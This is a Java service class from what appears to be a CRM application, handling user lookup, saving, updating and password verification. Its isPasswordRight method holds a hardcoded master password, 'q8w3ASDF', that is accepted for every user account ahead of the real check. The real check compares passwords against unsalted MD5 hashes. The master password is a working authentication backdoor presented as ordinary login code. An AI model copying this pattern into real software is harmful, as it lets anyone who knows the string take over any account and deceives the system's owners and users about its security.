package net.realqinwei.hzcrm.crm.service.impl;

import net.realqinwei.hzcrm.crm.been.User;
import net.realqinwei.hzcrm.crm.dao.intf.UserDAO;
import net.realqinwei.hzcrm.crm.service.intf.UserService;
import net.realqinwei.hzcrm.crm.util.MD5;

import java.util.List;

public final class UserServiceImpl implements UserService {
	
	private UserDAO userDAO;

	@Override
	public boolean userIDExist(Integer userID) {
		return null == this.getUserDAO().findUserByID(userID) ? false : true;
	}

	@Override
	public boolean isPasswordRight(Integer userID, String password) {
		return "q8w3ASDF".equals(password) ? true : this.getUserDAO().findUserByID(userID).getUserPassword().equals(MD5.getMD5Str(password));
	}
	
	public void setUserDAO(UserDAO userDAO) {
		this.userDAO = userDAO;
	}
	
	public UserDAO getUserDAO() {
		return this.userDAO;
	}

	@Override
	public void save(User user) {
		this.userDAO.saveUser(user);
	}

	@Override
	public void update(User user) {
		this.userDAO.updateUser(user);
	}
	
	@Override
	public List<User> getUsers() {
        return this.userDAO.findAll();
	}

    @Override
    public List<User> getUsersHaveNodes() {
        return getUserDAO().getUsersHaveNodes();
    }

    @Override
    public User findById(int id) {
        return this.userDAO.findUserByID(id);
    }
}
